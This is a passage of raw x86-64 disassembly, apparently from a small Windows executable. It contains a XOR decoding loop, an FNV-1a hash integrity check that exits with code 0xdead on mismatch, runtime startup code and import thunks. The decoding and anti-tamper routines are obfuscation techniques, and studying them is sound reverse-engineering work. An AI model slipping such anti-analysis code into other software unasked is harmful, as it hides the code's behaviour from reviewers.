  405b82:	48 83 c1 08          	add    $0x8,%rcx
  405b86:	8b 09                	mov    (%rcx),%ecx
  405b88:	89 4d ec             	mov    %ecx,-0x14(%rbp)
  405b8b:	8b 45 fc             	mov    -0x4(%rbp),%eax
  405b8e:	48 c1 e0 04          	shl    $0x4,%rax
  405b92:	48 8d 0d cf 3b 00 00 	lea    0x3bcf(%rip),%rcx        # 0x409768
  405b99:	48 01 c1             	add    %rax,%rcx
  405b9c:	48 83 c1 0c          	add    $0xc,%rcx
  405ba0:	0f b6 09             	movzbl (%rcx),%ecx
  405ba3:	88 4d eb             	mov    %cl,-0x15(%rbp)
  405ba6:	b8 00 00 00 00       	mov    $0x0,%eax
  405bab:	89 45 f8             	mov    %eax,-0x8(%rbp)
  405bae:	8b 45 f8             	mov    -0x8(%rbp),%eax
  405bb1:	8b 4d ec             	mov    -0x14(%rbp),%ecx
  405bb4:	39 c8                	cmp    %ecx,%eax
  405bb6:	0f 83 31 00 00 00    	jae    0x405bed
  405bbc:	e9 0d 00 00 00       	jmp    0x405bce
  405bc1:	8b 45 f8             	mov    -0x8(%rbp),%eax
  405bc4:	89 c1                	mov    %eax,%ecx
  405bc6:	83 c0 01             	add    $0x1,%eax
  405bc9:	89 45 f8             	mov    %eax,-0x8(%rbp)
  405bcc:	eb e0                	jmp    0x405bae
  405bce:	8b 45 f8             	mov    -0x8(%rbp),%eax
  405bd1:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  405bd5:	48 01 c1             	add    %rax,%rcx
  405bd8:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
  405bdc:	0f b6 09             	movzbl (%rcx),%ecx
  405bdf:	0f b6 45 eb          	movzbl -0x15(%rbp),%eax
  405be3:	31 c1                	xor    %eax,%ecx
  405be5:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  405be9:	88 08                	mov    %cl,(%rax)
  405beb:	eb d4                	jmp    0x405bc1
  405bed:	e9 5a ff ff ff       	jmp    0x405b4c
  405bf2:	c9                   	leave
  405bf3:	c3                   	ret
  405bf4:	01 04 02             	add    %eax,(%rdx,%rax,1)
  405bf7:	05 04 03 01 50       	add    $0x50010304,%eax
  405bfc:	55                   	push   %rbp
  405bfd:	48 89 e5             	mov    %rsp,%rbp
  405c00:	48 81 ec 60 00 00 00 	sub    $0x60,%rsp
  405c07:	48 8b 05 7a 3e 00 00 	mov    0x3e7a(%rip),%rax        # 0x409a88
  405c0e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  405c12:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405c16:	48 83 f8 00          	cmp    $0x0,%rax
  405c1a:	0f 84 32 01 00 00    	je     0x405d52
  405c20:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405c24:	48 83 c0 1c          	add    $0x1c,%rax
  405c28:	8b 00                	mov    (%rax),%eax
  405c2a:	89 45 f4             	mov    %eax,-0xc(%rbp)
  405c2d:	8b 45 f4             	mov    -0xc(%rbp),%eax
  405c30:	81 f8 00 00 10 00    	cmp    $0x100000,%eax
  405c36:	0f 86 14 00 00 00    	jbe    0x405c50
  405c3c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405c40:	48 83 c0 10          	add    $0x10,%rax
  405c44:	48 8b 00             	mov    (%rax),%rax
  405c47:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  405c4b:	e9 c2 ff ff ff       	jmp    0x405c12
  405c50:	8b 45 f4             	mov    -0xc(%rbp),%eax
  405c53:	83 f8 00             	cmp    $0x0,%eax
  405c56:	0f 84 e2 00 00 00    	je     0x405d3e
  405c5c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405c60:	48 83 c0 30          	add    $0x30,%rax
  405c64:	48 8b 00             	mov    (%rax),%rax
  405c67:	48 83 f8 00          	cmp    $0x0,%rax
  405c6b:	0f 84 cd 00 00 00    	je     0x405d3e
  405c71:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405c75:	48 83 c0 30          	add    $0x30,%rax
  405c79:	48 8b 00             	mov    (%rax),%rax
  405c7c:	48 8b 00             	mov    (%rax),%rax
  405c7f:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  405c83:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405c87:	48 83 c0 08          	add    $0x8,%rax
  405c8b:	48 8b 00             	mov    (%rax),%rax
  405c8e:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
  405c92:	48 31 c8             	xor    %rcx,%rax
  405c95:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  405c99:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405c9d:	48 83 c0 20          	add    $0x20,%rax
  405ca1:	48 8b 00             	mov    (%rax),%rax
  405ca4:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
  405ca8:	48 31 c8             	xor    %rcx,%rax
  405cab:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  405caf:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  405cb3:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  405cb7:	48 b8 25 23 22 84 e4 	movabs $0xcbf29ce484222325,%rax
  405cbe:	9c f2 cb 
  405cc1:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  405cc5:	b8 00 00 00 00       	mov    $0x0,%eax
  405cca:	89 45 c4             	mov    %eax,-0x3c(%rbp)
  405ccd:	8b 45 c4             	mov    -0x3c(%rbp),%eax
  405cd0:	8b 4d f4             	mov    -0xc(%rbp),%ecx
  405cd3:	39 c8                	cmp    %ecx,%eax
  405cd5:	0f 83 42 00 00 00    	jae    0x405d1d
  405cdb:	e9 0d 00 00 00       	jmp    0x405ced
  405ce0:	8b 45 c4             	mov    -0x3c(%rbp),%eax
  405ce3:	89 c1                	mov    %eax,%ecx
  405ce5:	83 c0 01             	add    $0x1,%eax
  405ce8:	89 45 c4             	mov    %eax,-0x3c(%rbp)
  405ceb:	eb e0                	jmp    0x405ccd
  405ced:	8b 45 c4             	mov    -0x3c(%rbp),%eax
  405cf0:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
  405cf4:	48 01 c1             	add    %rax,%rcx
  405cf7:	0f b6 09             	movzbl (%rcx),%ecx
  405cfa:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  405cfe:	48 31 c8             	xor    %rcx,%rax
  405d01:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  405d05:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  405d09:	48 b9 b3 01 00 00 00 	movabs $0x100000001b3,%rcx
  405d10:	01 00 00 
  405d13:	48 0f af c1          	imul   %rcx,%rax
  405d17:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  405d1b:	eb c3                	jmp    0x405ce0
  405d1d:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  405d21:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
  405d25:	48 39 c8             	cmp    %rcx,%rax
  405d28:	0f 84 10 00 00 00    	je     0x405d3e
  405d2e:	b8 ad de 00 00       	mov    $0xdead,%eax
  405d33:	49 89 c2             	mov    %rax,%r10
  405d36:	4c 89 d1             	mov    %r10,%rcx
  405d39:	e8 62 04 00 00       	call   0x4061a0
  405d3e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405d42:	48 83 c0 10          	add    $0x10,%rax
  405d46:	48 8b 00             	mov    (%rax),%rax
  405d49:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  405d4d:	e9 c0 fe ff ff       	jmp    0x405c12
  405d52:	c9                   	leave
  405d53:	c3                   	ret
  405d54:	01 04 02             	add    %eax,(%rdx,%rax,1)
  405d57:	05 04 03 01 50       	add    $0x50010304,%eax
  405d5c:	00 00                	add    %al,(%rax)
  405d5e:	00 00                	add    %al,(%rax)
  405d60:	55                   	push   %rbp
  405d61:	48 89 e5             	mov    %rsp,%rbp
  405d64:	48 81 ec 30 00 00 00 	sub    $0x30,%rsp
  405d6b:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  405d6f:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  405d73:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  405d77:	b8 00 00 00 00       	mov    $0x0,%eax
  405d7c:	89 45 fc             	mov    %eax,-0x4(%rbp)
  405d7f:	8b 45 fc             	mov    -0x4(%rbp),%eax
  405d82:	48 63 c0             	movslq %eax,%rax
  405d85:	48 c1 e0 03          	shl    $0x3,%rax
  405d89:	48 8d 0d 20 1b 00 00 	lea    0x1b20(%rip),%rcx        # 0x4078b0
  405d90:	48 01 c1             	add    %rax,%rcx
  405d93:	48 8d 05 26 1b 00 00 	lea    0x1b26(%rip),%rax        # 0x4078c0
  405d9a:	48 39 c1             	cmp    %rax,%rcx
  405d9d:	0f 84 46 00 00 00    	je     0x405de9
  405da3:	8b 45 fc             	mov    -0x4(%rbp),%eax
  405da6:	89 c1                	mov    %eax,%ecx
  405da8:	83 e8 ff             	sub    $0xffffffff,%eax
  405dab:	89 45 fc             	mov    %eax,-0x4(%rbp)
  405dae:	48 63 c9             	movslq %ecx,%rcx
  405db1:	48 c1 e1 03          	shl    $0x3,%rcx
  405db5:	48 8d 05 f4 1a 00 00 	lea    0x1af4(%rip),%rax        # 0x4078b0
  405dbc:	48 01 c8             	add    %rcx,%rax
  405dbf:	48 8b 00             	mov    (%rax),%rax
  405dc2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  405dc6:	48 8b 45 20          	mov    0x20(%rbp),%rax
  405dca:	49 89 c0             	mov    %rax,%r8
  405dcd:	48 8b 45 18          	mov    0x18(%rbp),%rax
  405dd1:	49 89 c3             	mov    %rax,%r11
  405dd4:	8b 45 10             	mov    0x10(%rbp),%eax
  405dd7:	49 89 c2             	mov    %rax,%r10
  405dda:	4c 89 d1             	mov    %r10,%rcx
  405ddd:	4c 89 da             	mov    %r11,%rdx
  405de0:	4c 8b 5d f0          	mov    -0x10(%rbp),%r11
  405de4:	41 ff d3             	call   *%r11
  405de7:	eb 96                	jmp    0x405d7f
  405de9:	c9                   	leave
  405dea:	c3                   	ret
  405deb:	00 01                	add    %al,(%rcx)
  405ded:	04 02                	add    $0x2,%al
  405def:	05 04 03 01 50       	add    $0x50010304,%eax
  405df4:	55                   	push   %rbp
  405df5:	48 89 e5             	mov    %rsp,%rbp
  405df8:	48 81 ec 30 00 00 00 	sub    $0x30,%rsp
  405dff:	b8 00 00 00 00       	mov    $0x0,%eax
  405e04:	89 45 fc             	mov    %eax,-0x4(%rbp)
  405e07:	8b 45 fc             	mov    -0x4(%rbp),%eax
  405e0a:	48 63 c0             	movslq %eax,%rax
  405e0d:	48 c1 e0 03          	shl    $0x3,%rax
  405e11:	48 8d 0d e8 b1 ff ff 	lea    -0x4e18(%rip),%rcx        # 0x401000
  405e18:	48 01 c1             	add    %rax,%rcx
  405e1b:	48 8d 05 de b1 ff ff 	lea    -0x4e22(%rip),%rax        # 0x401000
  405e22:	48 39 c1             	cmp    %rax,%rcx
  405e25:	0f 84 2c 00 00 00    	je     0x405e57
  405e2b:	8b 45 fc             	mov    -0x4(%rbp),%eax
  405e2e:	66 90                	xchg   %ax,%ax
  405e30:	83 e8 01             	sub    $0x1,%eax
  405e33:	89 45 fc             	mov    %eax,-0x4(%rbp)
  405e36:	48 63 c0             	movslq %eax,%rax
  405e39:	48 c1 e0 03          	shl    $0x3,%rax
  405e3d:	48 8d 0d bc b1 ff ff 	lea    -0x4e44(%rip),%rcx        # 0x401000
  405e44:	48 01 c1             	add    %rax,%rcx
  405e47:	48 8b 09             	mov    (%rcx),%rcx
  405e4a:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
  405e4e:	4c 8b 5d f0          	mov    -0x10(%rbp),%r11
  405e52:	41 ff d3             	call   *%r11
  405e55:	eb b0                	jmp    0x405e07
  405e57:	c9                   	leave
  405e58:	c3                   	ret
  405e59:	55                   	push   %rbp
  405e5a:	48 89 e5             	mov    %rsp,%rbp
  405e5d:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
  405e64:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  405e68:	48 8d 45 98          	lea    -0x68(%rbp),%rax
  405e6c:	49 89 c2             	mov    %rax,%r10
  405e6f:	4c 89 d1             	mov    %r10,%rcx
  405e72:	e8 39 04 00 00       	call   0x4062b0
  405e77:	8b 45 d4             	mov    -0x2c(%rbp),%eax
  405e7a:	83 e0 01             	and    $0x1,%eax
  405e7d:	83 f8 00             	cmp    $0x0,%eax
  405e80:	0f 84 0c 00 00 00    	je     0x405e92
  405e86:	0f b7 45 d8          	movzwl -0x28(%rbp),%eax
  405e8a:	89 45 84             	mov    %eax,-0x7c(%rbp)
  405e8d:	e9 08 00 00 00       	jmp    0x405e9a
  405e92:	b8 0a 00 00 00       	mov    $0xa,%eax
  405e97:	89 45 84             	mov    %eax,-0x7c(%rbp)
  405e9a:	31 c0                	xor    %eax,%eax
  405e9c:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  405ea0:	e8 13 04 00 00       	call   0x4062b8
  405ea5:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  405ea9:	48 8b 45 10          	mov    0x10(%rbp),%rax
  405ead:	48 83 f8 00          	cmp    $0x0,%rax
  405eb1:	0f 84 1d 00 00 00    	je     0x405ed4
  405eb7:	48 8b 45 10          	mov    0x10(%rbp),%rax
  405ebb:	49 89 c3             	mov    %rax,%r11
  405ebe:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  405ec2:	49 89 c2             	mov    %rax,%r10
  405ec5:	4c 89 d1             	mov    %r10,%rcx
  405ec8:	4c 89 da             	mov    %r11,%rdx
  405ecb:	e8 f0 03 00 00       	call   0x4062c0
  405ed0:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  405ed4:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  405ed8:	48 83 f8 00          	cmp    $0x0,%rax
  405edc:	0f 85 1b 00 00 00    	jne    0x405efd
  405ee2:	48 8d 05 17 11 00 00 	lea    0x1117(%rip),%rax        # 0x407000
  405ee9:	49 89 c2             	mov    %rax,%r10
  405eec:	4c 89 d1             	mov    %r10,%rcx
  405eef:	e8 d4 03 00 00       	call   0x4062c8
  405ef4:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  405ef8:	e9 31 00 00 00       	jmp    0x405f2e
  405efd:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  405f01:	48 8b 4d 88          	mov    -0x78(%rbp),%rcx
  405f05:	48 39 c8             	cmp    %rcx,%rax
  405f08:	0f 86 20 00 00 00    	jbe    0x405f2e
  405f0e:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  405f12:	48 83 e8 01          	sub    $0x1,%rax
  405f16:	0f be 00             	movsbl (%rax),%eax
  405f19:	83 f8 22             	cmp    $0x22,%eax
  405f1c:	0f 85 0c 00 00 00    	jne    0x405f2e
  405f22:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  405f26:	48 83 e8 01          	sub    $0x1,%rax
  405f2a:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  405f2e:	b8 00 00 03 00       	mov    $0x30000,%eax
  405f33:	49 89 c3             	mov    %rax,%r11
  405f36:	b8 00 00 01 00       	mov    $0x10000,%eax
  405f3b:	49 89 c2             	mov    %rax,%r10
  405f3e:	4c 89 d1             	mov    %r10,%rcx
  405f41:	4c 89 da             	mov    %r11,%rdx
  405f44:	e8 87 03 00 00       	call   0x4062d0
  405f49:	48 8b 05 90 11 00 00 	mov    0x1190(%rip),%rax        # 0x4070e0
  405f50:	48 8b 0d 91 11 00 00 	mov    0x1191(%rip),%rcx        # 0x4070e8
  405f57:	48 8b 15 92 11 00 00 	mov    0x1192(%rip),%rdx        # 0x4070f0
  405f5e:	48 8b 12             	mov    (%rdx),%rdx
  405f61:	49 89 d0             	mov    %rdx,%r8
  405f64:	48 8b 09             	mov    (%rcx),%rcx
  405f67:	49 89 cb             	mov    %rcx,%r11
  405f6a:	8b 00                	mov    (%rax),%eax
  405f6c:	49 89 c2             	mov    %rax,%r10
  405f6f:	4c 89 d1             	mov    %r10,%rcx
  405f72:	4c 89 da             	mov    %r11,%rdx
  405f75:	e8 e6 fd ff ff       	call   0x405d60
  405f7a:	31 c0                	xor    %eax,%eax
  405f7c:	49 89 c2             	mov    %rax,%r10
  405f7f:	4c 89 d1             	mov    %r10,%rcx
  405f82:	e8 51 03 00 00       	call   0x4062d8
  405f87:	8b 4d 84             	mov    -0x7c(%rbp),%ecx
  405f8a:	49 89 c9             	mov    %rcx,%r9
  405f8d:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
  405f91:	49 89 c8             	mov    %rcx,%r8
  405f94:	31 c9                	xor    %ecx,%ecx
  405f96:	49 89 cb             	mov    %rcx,%r11
  405f99:	49 89 c2             	mov    %rax,%r10
  405f9c:	4c 89 d1             	mov    %r10,%rcx
  405f9f:	4c 89 da             	mov    %r11,%rdx
  405fa2:	e8 59 b0 ff ff       	call   0x401000
  405fa7:	89 45 80             	mov    %eax,-0x80(%rbp)
  405faa:	e8 45 fe ff ff       	call   0x405df4
  405faf:	8b 45 80             	mov    -0x80(%rbp),%eax
  405fb2:	c9                   	leave
  405fb3:	c3                   	ret
  405fb4:	55                   	push   %rbp
  405fb5:	48 89 e5             	mov    %rsp,%rbp
  405fb8:	48 81 ec 40 00 00 00 	sub    $0x40,%rsp
  405fbf:	b8 e4 ca e3 13       	mov    $0x13e3cae4,%eax
  405fc4:	81 f0 e0 ca e3 13    	xor    $0x13e3cae0,%eax
  405fca:	49 89 c0             	mov    %rax,%r8
  405fcd:	b8 00 00 00 00       	mov    $0x0,%eax
  405fd2:	49 89 c3             	mov    %rax,%r11
  405fd5:	48 8d 45 fc          	lea    -0x4(%rbp),%rax
  405fd9:	49 89 c2             	mov    %rax,%r10
  405fdc:	4c 89 d1             	mov    %r10,%rcx
  405fdf:	4c 89 da             	mov    %r11,%rdx
  405fe2:	e8 49 01 00 00       	call   0x406130
  405fe7:	48 8d 05 a4 00 00 00 	lea    0xa4(%rip),%rax        # 0x406092
  405fee:	49 89 c2             	mov    %rax,%r10
  405ff1:	4c 89 d1             	mov    %r10,%rcx
  405ff4:	e8 ef 02 00 00       	call   0x4062e8
  405ff9:	b8 02 00 00 00       	mov    $0x2,%eax
  405ffe:	49 89 c2             	mov    %rax,%r10
  406001:	4c 89 d1             	mov    %r10,%rcx
  406004:	e8 e7 02 00 00       	call   0x4062f0
  406009:	48 8b 05 d0 10 00 00 	mov    0x10d0(%rip),%rax        # 0x4070e0
  406010:	48 8b 0d d1 10 00 00 	mov    0x10d1(%rip),%rcx        # 0x4070e8
  406017:	48 8b 15 d2 10 00 00 	mov    0x10d2(%rip),%rdx        # 0x4070f0
  40601e:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  406022:	48 8d 45 fc          	lea    -0x4(%rbp),%rax
  406026:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40602b:	b8 00 00 00 00       	mov    $0x0,%eax
  406030:	49 89 c1             	mov    %rax,%r9
  406033:	49 89 d0             	mov    %rdx,%r8
  406036:	49 89 cb             	mov    %rcx,%r11
  406039:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  40603d:	49 89 c2             	mov    %rax,%r10
  406040:	4c 89 d1             	mov    %r10,%rcx
  406043:	4c 89 da             	mov    %r11,%rdx
  406046:	e8 ad 02 00 00       	call   0x4062f8
  40604b:	48 8b 05 8e 10 00 00 	mov    0x108e(%rip),%rax        # 0x4070e0
  406052:	8b 00                	mov    (%rax),%eax
  406054:	83 f8 01             	cmp    $0x1,%eax
  406057:	0f 8e 13 00 00 00    	jle    0x406070
  40605d:	48 8b 05 84 10 00 00 	mov    0x1084(%rip),%rax        # 0x4070e8
  406064:	48 8b 00             	mov    (%rax),%rax
  406067:	48 83 e8 f8          	sub    $0xfffffffffffffff8,%rax
  40606b:	e9 07 00 00 00       	jmp    0x406077
  406070:	31 c0                	xor    %eax,%eax
  406072:	e9 03 00 00 00       	jmp    0x40607a
  406077:	48 8b 00             	mov    (%rax),%rax
  40607a:	49 89 c2             	mov    %rax,%r10
  40607d:	4c 89 d1             	mov    %r10,%rcx
  406080:	e8 d4 fd ff ff       	call   0x405e59
  406085:	49 89 c2             	mov    %rax,%r10
  406088:	4c 89 d1             	mov    %r10,%rcx
  40608b:	e8 70 02 00 00       	call   0x406300
  406090:	c9                   	leave
  406091:	c3                   	ret
  406092:	55                   	push   %rbp
  406093:	48 89 e5             	mov    %rsp,%rbp
  406096:	48 81 ec 20 00 00 00 	sub    $0x20,%rsp
  40609d:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4060a1:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4060a5:	48 8b 00             	mov    (%rax),%rax
  4060a8:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  4060ac:	49 89 cb             	mov    %rcx,%r11
  4060af:	8b 00                	mov    (%rax),%eax
  4060b1:	49 89 c2             	mov    %rax,%r10
  4060b4:	4c 89 d1             	mov    %r10,%rcx
  4060b7:	4c 89 da             	mov    %r11,%rdx
  4060ba:	e8 21 02 00 00       	call   0x4062e0
  4060bf:	c9                   	leave
  4060c0:	c3                   	ret
  4060c1:	55                   	push   %rbp
  4060c2:	48 89 e5             	mov    %rsp,%rbp
  4060c5:	48 81 ec 20 00 00 00 	sub    $0x20,%rsp
  4060cc:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4060d0:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  4060d4:	48 8b 05 05 10 00 00 	mov    0x1005(%rip),%rax        # 0x4070e0
  4060db:	8b 4d 10             	mov    0x10(%rbp),%ecx
  4060de:	89 08                	mov    %ecx,(%rax)
  4060e0:	48 8b 05 01 10 00 00 	mov    0x1001(%rip),%rax        # 0x4070e8
  4060e7:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
  4060eb:	48 89 08             	mov    %rcx,(%rax)
  4060ee:	48 8b 05 eb 0f 00 00 	mov    0xfeb(%rip),%rax        # 0x4070e0
  4060f5:	8b 00                	mov    (%rax),%eax
  4060f7:	83 f8 01             	cmp    $0x1,%eax
  4060fa:	0f 8e 15 00 00 00    	jle    0x406115
  406100:	48 8b 05 e1 0f 00 00 	mov    0xfe1(%rip),%rax        # 0x4070e8
  406107:	48 8b 00             	mov    (%rax),%rax
  40610a:	66 90                	xchg   %ax,%ax
  40610c:	48 83 c0 08          	add    $0x8,%rax
  406110:	e9 07 00 00 00       	jmp    0x40611c
  406115:	31 c0                	xor    %eax,%eax
  406117:	e9 03 00 00 00       	jmp    0x40611f
  40611c:	48 8b 00             	mov    (%rax),%rax
  40611f:	49 89 c2             	mov    %rax,%r10
  406122:	4c 89 d1             	mov    %r10,%rcx
  406125:	e8 2f fd ff ff       	call   0x405e59
  40612a:	c9                   	leave
  40612b:	c3                   	ret
  40612c:	00 00                	add    %al,(%rax)
  40612e:	00 00                	add    %al,(%rax)
  406130:	ff 25 52 0f 00 00    	jmp    *0xf52(%rip)        # 0x407088
  406136:	00 00                	add    %al,(%rax)
  406138:	ff 25 52 0f 00 00    	jmp    *0xf52(%rip)        # 0x407090
  40613e:	00 00                	add    %al,(%rax)
  406140:	ff 25 52 0f 00 00    	jmp    *0xf52(%rip)        # 0x407098
  406146:	00 00                	add    %al,(%rax)
  406148:	ff 25 52 0f 00 00    	jmp    *0xf52(%rip)        # 0x4070a0
  40614e:	00 00                	add    %al,(%rax)
  406150:	ff 25 52 0f 00 00    	jmp    *0xf52(%rip)        # 0x4070a8
  406156:	00 00                	add    %al,(%rax)
  406158:	ff 25 52 0f 00 00    	jmp    *0xf52(%rip)        # 0x4070b0
  40615e:	00 00                	add    %al,(%rax)
  406160:	ff 25 ba 0f 00 00    	jmp    *0xfba(%rip)        # 0x407120
  406166:	00 00                	add    %al,(%rax)
  406168:	ff 25 ba 0f 00 00    	jmp    *0xfba(%rip)        # 0x407128
  40616e:	00 00                	add    %al,(%rax)
  406170:	ff 25 ba 0f 00 00    	jmp    *0xfba(%rip)        # 0x407130
  406176:	00 00                	add    %al,(%rax)
  406178:	ff 25 3a 0f 00 00    	jmp    *0xf3a(%rip)        # 0x4070b8
  40617e:	00 00                	add    %al,(%rax)
  406180:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x407138
  406186:	00 00                	add    %al,(%rax)
  406188:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x407140
  40618e:	00 00                	add    %al,(%rax)
  406190:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x407148
  406196:	00 00                	add    %al,(%rax)
  406198:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x407150
  40619e:	00 00                	add    %al,(%rax)
  4061a0:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x407158
  4061a6:	00 00                	add    %al,(%rax)
  4061a8:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x407160
  4061ae:	00 00                	add    %al,(%rax)
  4061b0:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x407168
  4061b6:	00 00                	add    %al,(%rax)
  4061b8:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x407170
  4061be:	00 00                	add    %al,(%rax)
  4061c0:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x407178
  4061c6:	00 00                	add    %al,(%rax)
  4061c8:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x407180
  4061ce:	00 00                	add    %al,(%rax)
  4061d0:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x407188
  4061d6:	00 00                	add    %al,(%rax)
  4061d8:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x407190
  4061de:	00 00                	add    %al,(%rax)
  4061e0:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x407198
  4061e6:	00 00                	add    %al,(%rax)
  4061e8:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x4071a0
  4061ee:	00 00                	add    %al,(%rax)
  4061f0:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x4071a8
  4061f6:	00 00                	add    %al,(%rax)
  4061f8:	ff 25 6a 10 00 00    	jmp    *0x106a(%rip)        # 0x407268
  4061fe:	00 00                	add    %al,(%rax)
  406200:	ff 25 6a 10 00 00    	jmp    *0x106a(%rip)        # 0x407270
  406206:	00 00                	add    %al,(%rax)
  406208:	ff 25 72 10 00 00    	jmp    *0x1072(%rip)        # 0x407280
  40620e:	00 00                	add    %al,(%rax)
  406210:	ff 25 9a 0f 00 00    	jmp    *0xf9a(%rip)        # 0x4071b0
  406216:	00 00                	add    %al,(%rax)
  406218:	ff 25 9a 0f 00 00    	jmp    *0xf9a(%rip)        # 0x4071b8
  40621e:	00 00                	add    %al,(%rax)
  406220:	ff 25 9a 0f 00 00    	jmp    *0xf9a(%rip)        # 0x4071c0
  406226:	00 00                	add    %al,(%rax)
  406228:	ff 25 9a 0f 00 00    	jmp    *0xf9a(%rip)        # 0x4071c8
  40622e:	00 00                	add    %al,(%rax)
  406230:	ff 25 5a 10 00 00    	jmp    *0x105a(%rip)        # 0x407290
  406236:	00 00                	add    %al,(%rax)
  406238:	ff 25 92 0f 00 00    	jmp    *0xf92(%rip)        # 0x4071d0
  40623e:	00 00                	add    %al,(%rax)
  406240:	ff 25 92 0f 00 00    	jmp    *0xf92(%rip)        # 0x4071d8
  406246:	00 00                	add    %al,(%rax)
  406248:	ff 25 92 0f 00 00    	jmp    *0xf92(%rip)        # 0x4071e0
  40624e:	00 00                	add    %al,(%rax)
  406250:	ff 25 92 0f 00 00    	jmp    *0xf92(%rip)        # 0x4071e8
  406256:	00 00                	add    %al,(%rax)
  406258:	ff 25 92 0f 00 00    	jmp    *0xf92(%rip)        # 0x4071f0
  40625e:	00 00                	add    %al,(%rax)
  406260:	ff 25 5a 0e 00 00    	jmp    *0xe5a(%rip)        # 0x4070c0
  406266:	00 00                	add    %al,(%rax)
  406268:	ff 25 8a 0f 00 00    	jmp    *0xf8a(%rip)        # 0x4071f8
  40626e:	00 00                	add    %al,(%rax)
  406270:	ff 25 8a 0f 00 00    	jmp    *0xf8a(%rip)        # 0x407200
  406276:	00 00                	add    %al,(%rax)
  406278:	ff 25 8a 0f 00 00    	jmp    *0xf8a(%rip)        # 0x407208
  40627e:	00 00                	add    %al,(%rax)
  406280:	ff 25 8a 0f 00 00    	jmp    *0xf8a(%rip)        # 0x407210
  406286:	00 00                	add    %al,(%rax)
  406288:	ff 25 8a 0f 00 00    	jmp    *0xf8a(%rip)        # 0x407218
  40628e:	00 00                	add    %al,(%rax)
  406290:	ff 25 8a 0f 00 00    	jmp    *0xf8a(%rip)        # 0x407220
  406296:	00 00                	add    %al,(%rax)
  406298:	ff 25 8a 0f 00 00    	jmp    *0xf8a(%rip)        # 0x407228
  40629e:	00 00                	add    %al,(%rax)
  4062a0:	ff 25 8a 0f 00 00    	jmp    *0xf8a(%rip)        # 0x407230
  4062a6:	00 00                	add    %al,(%rax)
  4062a8:	ff 25 8a 0f 00 00    	jmp    *0xf8a(%rip)        # 0x407238
  4062ae:	00 00                	add    %al,(%rax)
  4062b0:	ff 25 8a 0f 00 00    	jmp    *0xf8a(%rip)        # 0x407240
  4062b6:	00 00                	add    %al,(%rax)
  4062b8:	ff 25 8a 0f 00 00    	jmp    *0xf8a(%rip)        # 0x407248
  4062be:	00 00                	add    %al,(%rax)
  4062c0:	ff 25 02 0e 00 00    	jmp    *0xe02(%rip)        # 0x4070c8
  4062c6:	00 00                	add    %al,(%rax)
